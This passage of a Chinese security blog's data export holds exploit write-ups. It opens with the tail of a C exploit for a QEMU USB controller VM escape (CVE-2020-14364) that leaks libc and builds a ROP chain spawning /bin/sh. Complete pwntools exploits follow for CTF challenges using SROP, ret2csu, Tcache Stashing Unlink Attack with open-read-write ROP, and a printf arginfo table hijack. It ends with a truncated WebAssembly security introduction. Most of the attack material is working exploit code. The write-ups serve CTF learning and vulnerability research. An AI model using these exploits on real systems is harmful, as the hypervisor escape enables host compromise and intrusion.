(size_t)vir_addr;   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移   size_t offset = vir / 0x1000 * 8;   if (lseek(fd,offset,SEEK_SET) == -1) &#123;      die(&quot;lseek pagemap error&quot;);   &#125;   size_t addr;   if (read(fd,&amp;addr,8) != 8) &#123;      die(&quot;read pagemap error&quot;);   &#125;   addr = (addr &amp; PFN_MASK) * 0x1000 + vir % 0x1000;   return addr;&#125;void init() &#123;    /* 映射一块dmabufs 也就是dma模式的读写，读写的数据都在这块内存上*/    dmabuf = mmap(0, 0x6000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (dmabuf == MAP_FAILED)        die(&quot;mmap&quot;);    /* 上锁，防止被调度 */    mlock(dmabuf, 0x6000);    td = (UHCI_TD *)dmabuf;    td_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);    setup_buf = dmabuf + 0x300;    data_buf = dmabuf + 0x1000;&#125;void set_UHCIState() &#123;    //清空UHCI之前的状态，这样我们在下一次就可以触发定时任务了    pmio_write(0,UHCI_CMD_HCRESET);    //初始化USB端口    for(int i=0x10;i &lt;= 0x1f;i++)        pmio_write(i, UHCI_PORT_CCS | UHCI_PORT_RESET | UHCI_PORT_EN);    uint32_t td_phy_addr = get_phys_addr(td);    *td_phy_addr_in_any_frame = td_phy_addr;    //pmio_write(6, 0); //设置s-&gt;frnum为0    pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址    pmio_write(0, UHCI_CMD_RS);    sleep(1);&#125;void init_state() &#123;    //初始化时，使用正常的长度    setup_buf[6] = 0xff;    setup_buf[7] = 0x0;    td-&gt;link = get_phys_addr(td);    td-&gt;ctrl = TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;    td-&gt;buffer = get_phys_addr(setup_buf);    puts(&quot;set_UHCIState&quot;);    set_UHCIState();&#125;void set_length(uint16_t len, uint8_t option)&#123;    setup_buf[0] = USB_TOKEN_IN | option;    //set the length    setup_buf[6] = len &amp; 0xff;    setup_buf[7] = (len &gt;&gt; 8 ) &amp; 0xff;    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;    td-&gt;buffer = get_phys_addr(setup_buf);    set_UHCIState();&#125;//do_token_in读取数据void do_copy_read(uint16_t len)&#123;    //设置token进入do_token_in    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token =  USB_TOKEN_IN | (len-1) &lt;&lt; 21; //设置p-&gt;iov.size    td-&gt;buffer = get_phys_addr(data_buf);    set_UHCIState();&#125;//do_token_out写入数据void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index, uint16_t len)&#123;    if (len == 0x11) &#123;       len = len - 1;       *(unsigned long *)(data_buf + offset) = 0x0000000200000002; //setup_state覆盖成原先的内容       *(unsigned int *)(data_buf + 0x8 +offset) = setup_len; //覆盖setup_len       *(unsigned int *)(data_buf + 0xc+ offset) = setup_index; //覆盖setup_index    &#125;    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token =  USB_TOKEN_OUT | (len-1) &lt;&lt; 21;    td-&gt;buffer = get_phys_addr(data_buf);    set_UHCIState();&#125;//任意写void arb_write_seq(uint64_t target_addr, uint64_t *payload,uint64_t len)&#123;    //初始化setup_state    set_length(0x500, USB_DIR_OUT);    unsigned long offset = target_addr - data_buf_addr;    //设置越界长度    set_length(0x1010, USB_DIR_OUT);    puts(&quot;set index&quot;);    //getchar();    //将setup_index设置为0x1000    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    //覆盖setup_state、setup_len、setup_index    do_copy_write(0, offset+len, offset-0x10, 0x11);    memcpy(data_buf,payload,len);    //puts(&quot;wait&quot;);    //getchar();    do_copy_write(0, 0xffff, 0,len);&#125;int main() &#123;   init();   //申请IO权限   iopl(3);   init_state();   set_length(0x5000,USB_DIR_IN);   for(int i = 0; i &lt; 4; i++)        do_copy_read(0x400);  //set index 0x1000   do_copy_read(0x400);      //read 0x400 to dmabuf   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);   struct USBDevice usb_device;   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);   data_buf_addr = dev_addr + 0xdc - 0x8;   //data_buf_addr = dev_addr + 0xdc;   printf(&quot;USBDevice dev_addr: 0x%lx\\n&quot;, dev_addr);   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\\n&quot;, data_buf_addr);   uint64_t *tmp = (uint64_t *)(data_buf + 0x4);   uint64_t libc_base = -1;   uint64_t main_arena_xx_addr;   //搜索main_arena指针   for (int j=0;j&lt;100;j++) &#123;      for (int i=0;i&lt;0x400/0x8;i++) &#123;         main_arena_xx_addr = tmp[i];         if ((main_arena_xx_addr &gt;&gt; 40) == 0x7f &amp;&amp; ((main_arena_xx_addr &amp; 0xfff) == 0xc00)) &#123;            //printf(&quot;heap size=0x%lx fd=0x%lx\\n&quot;,tmp[i-1],main_arena_xx_addr);            libc_base = main_arena_xx_addr - ARENA_OFFSET;            goto outer;         &#125;      &#125;      //write(1,data_buf,0x400);      do_copy_read(0x400);   &#125;   outer:   if(libc_base == -1)&#123;       printf(&quot;Error,DO IT AGAIN\\n&quot;);       return 0;   &#125;   uint64_t system_addr = libc_base + SYSTEM_OFFSET;   printf(&quot;leak libc_base address : 0x%lx!\\n&quot;, libc_base);   printf(&quot;leak system_addr address: 0x%lx!\\n&quot;, system_addr);   uint64_t mov_rdx_qp_rdi = libc_base + GADGET_OFFSET; //mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]   uint64_t set_context = libc_base + SETCONTEXT_OFFSET;   uint64_t pop_rdi_rbp = libc_base + POP_RDI_RBP_OFFSET;   uint64_t payload[0x400/0x8];   int type_base = 0x25;   payload[0x0] = dev_addr + 0x10;   //fake a USBDeviceClass at dev_addr + 0x10   payload[0x2] = dev_addr + type_base*0x8; //type   payload[0x9] = dev_addr + 0x8; //bus   payload[0xe] = dev_addr + 0x8; //port   //ep_stopped   payload[0x24] = mov_rdx_qp_rdi;   int rop_start = 0x40;   //ROP   payload[0x1] = dev_addr + rop_start*8 ;   //rdx   payload[rop_start+0x4] = set_context;   payload[rop_start+0xa0/0x8] = dev_addr + (rop_start*8+0xb0); //new stack   payload[rop_start+0xa8/0x8] = pop_rdi_rbp;   payload[rop_start+0xb0/0x8] = dev_addr + (rop_start*8+0xc8);   payload[rop_start+0xc0/0x8] = system_addr;   char *cmd = &quot;/bin/sh&quot;;   memcpy(&amp;payload[rop_start+0xc8/0x8],cmd,strlen(cmd)+1);   //fake a type   payload[type_base] = 0; //name   payload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;   payload[type_base+0xc] = 0; //type-&gt;parent_type   payload[type_base+0xd] = dev_addr + 0x8; //type-&gt;class   char *p = &quot;usb-device&quot;;   memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);   arb_write_seq(dev_addr,payload,0x400);&#125;\n\n0x06 参考\n如何用多种方法利用QEMU漏洞（三）\nPCI&#x2F;PCIe学习——总线结构及配置空间\nKVM虚拟机代码揭秘——QEMU的PCI总线与设备（上）\nQEMU-KVM的初始化与客户系统的执行\nCVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路\n\n","categories":["CTF","安全研究","CVE"],"tags":["QEMU","虚拟机逃逸"]},{"title":"SROP","url":"/2020/04/05/SROP/","content":"SROP可以在gadgets很少的时候的栈利用里使用，近期学习linux后，明白了程序进行系统调用时，状态会从用户态切换到内核态。而切换的实质是将用户态的寄存器保存。而返回的时候，再重新恢复用户态的寄存器。系统调用signreturn，是内核态恢复到用户态；它的具体操作是**[从用户的栈中弹出寄存器的值]{.mark}**。因此，如果栈能被我们控制，然后我们能够构造signreturn的系统调用，那么就能完成利用。我们的目的就是可以借助signreturn来控制全部的寄存器。\n例题ciscn_2019_s_3首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，存在一个栈溢出漏洞。\n\n\n这里，正好我们能控制rax为0xF，x64下的linux的signreturn系统调用号正好为0xF。于是，我们便可以利用SROP来达到利用。\n完整的exp\nfrom pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)sh = process(&#x27;./ciscn_s_3&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26491)csu_call = 0x0000000000400580csu_pop = 0x000000000040059Amov_rax_sigreturn = 0x00000000004004DAsyscall = 0x0000000000400517vuln = 0x00000000004004EDpop_rdi = 0x00000000004005a3payload = &#x27;a&#x27;*0x10 + p64(vuln)sh.send(payload)sh.recv(0x20)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))binsh_addr = stack_addr - 0x118print &#x27;binsh_addr=&#x27;,hex(binsh_addr)print &#x27;stack_addr=&#x27;,hex(stack_addr)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binsh_addrframe.rsi = 0frame.rdx = 0frame.rip = syscallpayload = &#x27;/bin/sh&#x27;.ljust(0x10,&#x27;\\x00&#x27;) + p64(mov_rax_sigreturn) + p64(syscall) + str(frame)sh.send(payload)sh.interactive()\n\n另外一种方法是ret2csu，构造execve的系统调用。这里正好rax能够控制为0x3B，x64下对应的系统调用为execve。\n\n\n于是解法二完整的exp为\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./ciscn_s_3&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26491)csu_call = 0x0000000000400580csu_pop = 0x000000000040059Amov_rax_execvecall = 0x00000000004004E2syscall = 0x0000000000400517vuln = 0x00000000004004EDpop_rdi = 0x00000000004005a3payload = &#x27;a&#x27;*0x10 + p64(vuln)sh.send(payload)sh.recv(0x20)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))binsh_addr = stack_addr - 0x118print &#x27;binsh_addr=&#x27;,hex(binsh_addr)print &#x27;stack_addr=&#x27;,hex(stack_addr)payload = &#x27;/bin/sh&#x27;.ljust(0x10,&#x27;\\x00&#x27;) + p64(csu_pop)payload += p64(0) #rbxpayload += p64(1) #rbp#该存存放syscall指令的地址payload += p64(stack_addr - 0xC0) #r12payload += p64(0)*3payload += p64(mov_rax_execvecall)payload += p64(csu_call)#r12指向这里的roppayload += p64(pop_rdi) + p64(binsh_addr)payload += p64(syscall)sh.send(payload)sh.interactive()","categories":["CTF"],"tags":["SROP","ret2csu"]},{"title":"Tcache_Stashing_Unlink_Attack","url":"/2020/04/30/Tcache_Stashing_Unlink_Attack/","content":"Tcache_Stashing_Unlink_Attack就是calloc的分配不从tcache bin里取chunk，calloc会遍历fastbin、small bin、large bin，如果在tcache bin里，对应的size的bin不为空，则会将这些bin的chunk采用头插法插入到tcache bin里。首先，我们来看一下glibc 2.29的源码。\n/*      If a small request, check regular bin.  Since these &quot;smallbins&quot;      hold one size each, no searching within bins is necessary.      (For a large request, we need to wait until unsorted chunks are      processed to find best fit. But for small ones, fits are exact      anyway, so we can check now, which is faster.)    */      if (in_smallbin_range (nb))      &#123;        idx = smallbin_index (nb);        bin = bin_at (av, idx);          if ((victim = last (bin)) != bin) //取该索引对应的small bin中最后一个chunk          &#123;            bck = victim-&gt;bk;  //获取倒数第二个chunk        if (__glibc_unlikely (bck-&gt;fd != victim)) //检查双向链表完整性          malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);            set_inuse_bit_at_offset (victim, nb);            bin-&gt;bk = bck; //将victim从small bin的链表中卸下            bck-&gt;fd = bin;              if (av != &amp;main_arena)          set_non_main_arena (victim);            check_malloced_chunk (av, victim, nb);  #if USE_TCACHE        /* While we&#x27;re here, if we see other chunks of the same size,          stash them in the tcache.  */        size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) //如果该索引在tcache bin范围          &#123;            mchunkptr tc_victim;              /* While bin not empty and tcache not full, copy chunks over.  */            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  //当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里               &amp;&amp; (tc_victim = last (bin)) != bin)          &#123;            if (tc_victim != 0)              &#123;                bck = tc_victim-&gt;bk;                set_inuse_bit_at_offset (tc_victim, nb);                if (av != &amp;main_arena)              set_non_main_arena (tc_victim);                bin-&gt;bk = bck; //将当前chunk从small bin里卸下                bck-&gt;fd = bin;                        //放入tcache bin里                tcache_put (tc_victim, tc_idx);                  &#125;          &#125;          &#125;  #endif            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;          &#125;      &#125;  \n\n如上，我们看到，从small bin中取出最后一个chunk的时候，对双向链表做了完整性的检查，然而，后面将剩余chunk放入tcache bin的时候却没有这个检查。然后，bck-&gt;fd &#x3D; bin这句代码，可以将bck-&gt;fd处写一个main_arena地址。如果我们可以控制bck，那么就能实现任意地址处写一个main_arena的地址。同理，如果我们能够控制small bin的bck，并且保证vuln_addr-&gt;fd &#x3D; bck，那么就能分配到vuln_addr处。\n为了加深理解，我们从两道题来巩固一下。\nhitcon_ctf_2019_one_punch首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\nDelete功能没有清空指针，可以double free。\n\n\n以及UAF编辑\n\n\nAdd功能使用的是calloc分配，并且size的大小不在fastbin范围，因此用不了fastbin attack。\n\n\n后门函数里使用malloc分配\n\n\n但是要想利用后面函数，就得绕过if的检查，而此处是一个堆地址，我们不能直接修改，我们可以利用Tcache_Stashing_Unlink_Attack将此处写一个main_arena地址，进而可以绕过if，执行malloc从tcache bin里分配到目标处。此处，我们的目的仅仅是往那个堆地址处写一个大于6的数据，在Tcache_Stashing_Unlink_Attack时，会从small bin里取chunk到tcache bin，直到tcache bin填满，但是如果我们伪造了bck，第二次遍历的时候就会发生错误，因为目标处我们不可控。因此，我们只需要让其只进行第一次的遍历，那么，我们就得事先将对应的tcache bin里填满6个。为了绕过对small bin最后一个chunk的完整性检查，我们不能伪造最后一个chunk的bck，而应该伪造倒数第二个chunk的bck。因此，我们需要保证在small bin里有两个chunk。\n然后通过calloc取出最后一个chunk时，发生Tcache Stashing，从而将目标处写上一个main_arena地址。\n#0  add(0,&#x27;a&#x27;*0x218)  #1  add(1,&#x27;b&#x27;*0x80)  #1放入tcache bin 6次，剩余1个空位  for i in range(6):     delete(1)     edit(1,&#x27;b&#x27;*0x10)  \n\n接下来，泄露堆地址和glibc地址\nfor i in range(6):     delete(0)     edit(0,&#x27;a&#x27;*0x10)  delete(0)  show(0)  sh.recvuntil(&#x27;hero name: &#x27;)  heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  print &#x27;heap_addr=&#x27;,hex(heap_addr)  edit(0,&#x27;a&#x27;*0x10)  #得到unsorted bin  delete(0)  show(0)  sh.recvuntil(&#x27;hero name: &#x27;)  main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  \n\n接下来，我们需要得到两个small bin。首先，得到第一个0x90的small bin\n#从unsorted bin里切割0x190，剩余0x90  add(1,&#x27;a&#x27;*0x180)  #触发malloc_consolidate整理unsorted bin，放入small bin  add(1,&#x27;a&#x27;*0x400)  #gap  add(2,&#x27;a&#x27;*0x100)  \n\n接下来，得到我们第二个small bin。\nfor i in range(7):     delete(1)     edit(1,&#x27;a&#x27;*0x10)  #1放入unsorted bin  delete(1)  #从unsorted bin里切割0x380，剩余0x90  add(2,&#x27;a&#x27;*0x370)  #触发malloc_consolidate整理unsorted bin，放入small bin  add(2,&#x27;a&#x27;*0x400)  \n\n\n\n现在，我们要修改倒数第二个small bin的bk为目标地址，然后实施tcache stashing attack\n#修改倒数第二个头chunk的bk，fd不变  edit(1,&#x27;a&#x27;*0x370 + p64(0) + p64(0x91) + p64(heap_addr + 0x180) + p64(heap_addr + 0x20 - 0x260))  #Tcache Stashing Unlink Attack，目标地址处被写入了small bin的地址，因此绕过了后面函数的验证，现在可以调用后门函数了  add(1,&#x27;a&#x27;*0x80)  \n\n现在，我们就可以调用后面函数了，那么通过UAF伪造tcache bin的next指针，分配到目标处。我们可以改写malloc_hook或者free_hook。如果没有开沙箱的话，我们直接改写为one_gadget即可，如果开啦，我们改为add rsp，0xXX，使得栈进入我们可控的buf区\n\n\n#coding:utf8from pwn import *sh = process(&#x27;./hitcon_ctf_2019_one_punch&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26885)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.29.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]def add(index,content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))   sh.sendafter(&#x27;hero name:&#x27;,content)def malloc(content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;50056&#x27;)   sh.send(content)def edit(index,content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))   sh.sendafter(&#x27;hero name:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))#0add(0,&#x27;a&#x27;*0x218)#1add(1,&#x27;b&#x27;*0x80)#1放入tcache bin 6次，剩余1个空位for i in range(6):   delete(1)   edit(1,&#x27;b&#x27;*0x10)for i in range(6):   delete(0)   edit(0,&#x27;a&#x27;*0x10)delete(0)show(0)sh.recvuntil(&#x27;hero name: &#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)edit(0,&#x27;a&#x27;*0x10)#得到unsorted bindelete(0)show(0)sh.recvuntil(&#x27;hero name: &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sadd_rsp_48 = libc_base + 0x000000000008cfd6pop_rdi = libc_base + 0x0000000000026542pop_rsi = libc_base + 0x0000000000026f9epop_rdx = libc_base + 0x000000000012bda6pop_rax = libc_base + 0x0000000000047cf8syscall_ret = libc_base + 0x000000000010D022open_addr = libc_base + libc.sym[&#x27;open&#x27;]read_addr = libc_base +  libc.sym[&#x27;read&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;add_rsp_48=&#x27;,hex(add_rsp_48)#从unsorted bin里切割0x190，剩余0x90add(1,&#x27;a&#x27;*0x180)#触发malloc_consolidate整理unsorted bin，放入small binadd(1,&#x27;a&#x27;*0x400)#gapadd(2,&#x27;a&#x27;*0x100)for i in range(7):   delete(1)   edit(1,&#x27;a&#x27;*0x10)#1放入unsorted bindelete(1)#从unsorted bin里切割0x380，剩余0x90add(2,&#x27;a&#x27;*0x370)#触发malloc_consolidate整理unsorted bin，放入small binadd(2,&#x27;a&#x27;*0x400)#修改倒数第二个头chunk的bk，fd不变edit(1,&#x27;a&#x27;*0x370 + p64(0) + p64(0x91) + p64(heap_addr + 0x180) + p64(heap_addr + 0x20 - 0x260))#Tcache Stashing Unlink Attack，目标地址处被写入了small bin的地址，因此绕过了后面函数的验证，现在可以调用后门函数了add(1,&#x27;a&#x27;*0x80)#将malloc_hook链接到tcache binedit(0,p64(malloc_hook_addr))malloc(&#x27;/flag\\x00&#x27;)flag_addr = heap_addr#写malloc_hookmalloc(p64(add_rsp_48))#open(flag_addr,0)rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret)#read(3,flag_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#write(1,flag_addr,0x30)rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(write_addr)add(1,rop)sh.interactive()\n\nRedPacket_SoEasyPwn1此题与上一题差不多，直接贴上exp\n#coding:utf8from pwn import *#sh = process(&#x27;./RedPacket_SoEasyPwn1&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28039)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.29.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]open_s = libc.sym[&#x27;open&#x27;]read_s = libc.sym[&#x27;read&#x27;]puts_s = libc.sym[&#x27;puts&#x27;]def add(index,size,content):   sh.sendlineafter(&#x27;Your input:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))   idx = 0   if size == 0x10:      idx = 1   elif size == 0xF0:      idx = 2   elif size == 0x300:      idx = 3   elif size == 0x400:      idx = 4   else:      raise Exception(&#x27;error size&#x27;)   sh.sendlineafter(&#x27;How much do you want?&#x27;,str(idx))   sh.sendafter(&#x27;content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Your input:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))def edit(index,content):   sh.sendlineafter(&#x27;Your input:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;Your input:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))def stackOverflow(payload):   sh.sendlineafter(&#x27;Your input:&#x27;,&#x27;666&#x27;)   sh.sendafter(&#x27;What do you want to say?&#x27;,payload)for i in range(8):   add(i,0x400,&#x27;a&#x27;)#六个chunk用于放入0x100的tcache binfor i in range(8,14):   add(i,0xF0,&#x27;b&#x27;)#得到0x410大小的unsorted binfor i in range(14):   delete(i)#泄露堆地址show(1)sh.recv(1)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)#泄露libc地址show(7)sh.recv(1)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_spop_rdi = libc_base + 0x0000000000026542pop_rsi = libc_base + 0x0000000000026f9epop_rdx = libc_base + 0x000000000012bda6leave_ret = libc_base + 0x0000000000058373open_addr = libc_base + open_sread_addr = libc_base + read_sputs_addr = libc_base + puts_sprint &#x27;libc_base=&#x27;,hex(libc_base)rop_addr = heap_addr + 0x1F80flag_addr = rop_addr + 0x78#open(flag_addr,0)rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)#read(fd,flag_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(flag_addr)rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)#rop += &#x27;/flag&#x27;.ljust(8,&#x27;\\x00&#x27;)rop += &#x27;/password.txt\\x00&#x27;#从0x410的unsorted bin里切割一个0x310的空间，剩下的0x100的unsorted binadd(0,0x300,&#x27;a&#x27;)#malloc一大的堆，使得unsorted bin里的0x100的chunk放入small binadd(0,0x400,&#x27;b&#x27;)#挡住top chunk，不能小于0x100，不然会从得到的small bin里取，这样我们前面就白费add(1,0x400,&#x27;a&#x27;)#我们使用同样的方法，来得到第二个0x100的unsorted bindelete(0)add(1,0x300,&#x27;a&#x27;)add(1,0x400,&#x27;b&#x27;)#修改第一个small bin的bk，指向目标地址edit(0,&#x27;a&#x27;*0x300 + p64(0) + p64(0x101) + p64(heap_addr + 0x1F70) + p64(heap_addr - 0x1010 + 0x800 - 0x10))#Tcache Stashing Unlink Attack，目标地址处被写入了small bin的地址，因此绕过了后面函数的验证，现在可以调用后面函数了#我们顺便将rop布置在这个堆里add(2,0xF0,rop)#栈迁移到我们的rop里执行stackOverflow(&#x27;a&#x27;*0x80 + p64(rop_addr - 0x8) + p64(leave_ret))sh.interactive()","categories":["CTF"],"tags":["tcache","fastbin","Tcache_Stashing_Unlink_Attack","small bin","large bin","calloc"]},{"title":"X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)","url":"/2020/07/26/X-nuca_2018_revenge/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，bss上存在无限溢出\n\n\n由于该程序是静态编译，我们可以覆盖到下方某些函数指针，我们可以将__printf_arginfo_table虚表指针覆盖，指向我们可控的地方。\n\n\n这样printf调用时，就调用相应的函数，但是rdi、rsi、rsp这些不可控\n\n\n这时有一个巧妙的方法，我们让程序执行到\n000000000046B9A8 mov rbx, cs:_dl_scope_free_list此处\n\n\n正好这里用到的两个变量，我们也能够溢出覆盖到，我们看到,rax我们也可控，因此，我们只需再找一个gadget，xchg eax,esp，然后将_dl_wait_lookup_done设置为该gadget的地址，即可完成栈迁移，[其中xchg会清空esp的高4字节，经过试验，发现除了单字节的xchg外，像双字节、四字节的xchg，都会清空高位。]{.mark}\n\n\n#coding:utf8from pwn import *sh = process(&#x27;./X-nuca_2018_revenge&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26563)#xchg eax, esp ; retxchg_eax_esp = 0x00000000004a1a79bss = 0x00000000006B73E0&#x27;&#x27;&#x27;.text:000000000046B9A8                 mov     rbx, cs:_dl_scope_free_list.text:000000000046B9AF                 test    rbx, rbx.text:000000000046B9B2                 jz      short loc_46B9F8.text:000000000046B9B4                 mov     rax, [rbx].text:000000000046B9B7                 cmp     rax, 31h.text:000000000046B9BB                 jbe     short loc_46BA30.text:000000000046B9BD                 call    cs:_dl_wait_lookup_done..............................................text:000000000046B99B                 add     rsp, 8.text:000000000046B99F                 mov     eax, ebx.text:000000000046B9A1                 pop     rbx.text:000000000046B9A2                 pop     rbp.text:000000000046B9A3                 retn&#x27;&#x27;&#x27;_dl_scope_free_xx = 0x000000000046B9A8pop_rdi = 0x0000000000400525pop_rsi = 0x00000000004059d6pop_rdx = 0x0000000000435435pop_rax = 0x000000000043364csyscall = 0x0000000000400368payload = p64(bss + 0x10)payload += &#x27;/bin/sh\\x00&#x27;#roppayload += p64(pop_rdi) + p64(bss + 0x8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3B) + p64(syscall)payload = payload.ljust(0x398,&#x27;a&#x27;) + p64(_dl_scope_free_xx)payload = payload.ljust(0x4E0,&#x27;a&#x27;)payload += p64(xchg_eax_esp) #_dl_wait_lookup_donepayload = payload.ljust(0x530,&#x27;a&#x27;)payload += p64(bss) #_dl_scope_free_listpayload = payload.ljust(0x650,&#x27;a&#x27;)payload += &#x27;\\x00&#x27;*0x78payload += p64(bss) #__printf_arginfo_tablesh.sendline(payload)sh.interactive()","categories":["CTF"],"tags":["ROP","全局变量溢出","变量覆盖","栈迁移"]},{"title":"WebAssembly安全研究总结","url":"/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/","content":"WebAssembly 安全研究总结WebAssembly是什么&ensp;&ensp;WebAssembly（简称wasm） 是一种可移植、体积小、加载快并且能够在浏览器上运行的一种程序文件。其能够在JavaScript通过接口进行调用执行。开发者们一直都比较关心JS的运行速度问题，V8引擎在JS的运行速度方面做了巨大的优化，但是少数情况下我们进行大量本地运算的时候，仍然可能遇到性能瓶颈，这个时候webassembly的作用就凸现出来了。例如AutoCAD利用编译器将其沉淀了30多年的代码直接编译成WebAssembly，同时性能基于之前的普通Web应用得到了很大的提升。&ensp;&ensp;C&#x2F;C++&#x2F;Rust源代码可以被编译为WebAssembly文件，然后JS层就可以对其进行调用。WebAssembly文件中存储着字节码，位于JavaScript引擎中的WebAssembly虚拟机将会执行字节码。字节码的执行有两种方式，一种是在运行时边读取opcode边执行，另一种则是在执行前将整个WebAssembly JIT翻译为本地汇编代码，然后直接跳转到汇编代码执行。V8采用的是第二种方式。\nWebAssembly虚拟机&ensp;&ensp;WebAssembly虚拟机是一种栈虚拟机，变量使用栈进行传递。WebAssembly虚拟机有两个栈，即数据栈和指令栈。\n\n&ensp;&ensp;WebAssembly的数据栈只用于存储数据，不会存储任何指针；指令栈只用于存储指令和数据在数据栈中的下标，不会存储任何数据，并且在执行opcode时会对取出的下标进行边界检查。由于WebAssembly将数据和程序流用栈给分隔开了，也就不会发生像汇编代码中的栈溢出劫持返回地址的漏洞利用手法。简而言之，WebAssembly中的所有指令都无法操作指针，也就不存在任意地址读写。但是传统的漏洞仍然存在，只是不能直接劫持程序流了。\nWebAssembly文件格式编译代码emcc hello.c -s WASM&#x3D;1 -o hello.html\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123;   char buf[100];   